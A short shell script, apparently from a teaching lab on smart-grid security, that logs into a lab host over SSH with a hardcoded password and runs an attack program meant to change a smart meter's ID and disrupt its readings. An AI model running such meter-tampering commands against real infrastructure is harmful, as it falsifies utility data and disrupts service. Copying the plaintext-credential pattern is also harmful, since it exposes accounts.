#!/bin/sh

# Description: This file/script demostrates the disruption of smart meter readings by changing the ID of the smart meter
# Tag: Change Meter25 Id to 26   
sshpass -p 'Student12345@' ssh -t student@172.16.2.223 -o ConnectTimeout=5 "cd C:\Windows\Temp\SmartMetertest && Attackscript.exe 9"